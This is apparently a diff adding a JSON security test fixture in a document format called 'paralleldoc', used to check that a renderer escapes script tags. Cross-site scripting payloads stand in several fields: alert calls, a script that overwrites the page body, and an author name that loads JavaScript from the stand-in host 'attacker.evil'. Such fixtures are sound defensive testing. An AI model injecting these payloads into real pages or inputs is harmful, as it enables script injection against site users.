@@ -1,0 +1,50 @@
+{
+  "format": "paralleldoc",
+  "version": "3.0",
+  "metadata": {
+    "document_id": "doc-sec-01-script-tags",
+    "revision": "rev-1",
+    "title": "<script>window.XSS_DETECTED=true;alert('XSS-TITLE')</script>",
+    "author_refs": [
+      "auth-sec-01"
+    ]
+  },
+  "authors": [
+    {
+      "id": "auth-sec-01",
+      "kind": "human",
+      "name": "<script src=\"https://attacker.evil/payload.js\"></script>Malicious Author"
+    }
+  ],
+  "units": [
+    {
+      "id": "u-sec-01",
+      "kind": "source",
+      "title": "<script>alert('UNIT_TITLE')</script>Clause 1",
+      "text": "Payload injection inside body: <script>document.body.innerHTML='PWNED';</script> Plain text content.",
+      "text_format": "plain",
+      "author_refs": [
+        "auth-sec-01"
+      ],
+      "epistemic": "reported",
+      "status": "reviewed",
+      "source_refs": [],
+      "asset_ids": [],
+      "provenance": {
+        "label": "<script>alert('PROVENANCE')</script>Doc §1"
+      }
+    }
+  ],
+  "groups": [
+    {
+      "id": "g-sec-01",
+      "title": "<script>alert('GROUP')</script>Security Test Group",
+      "unit_refs": [
+        "u-sec-01"
+      ]
+    }
+  ],
+  "visuals": [],
+  "assets": [],
+  "profiles": []
+}
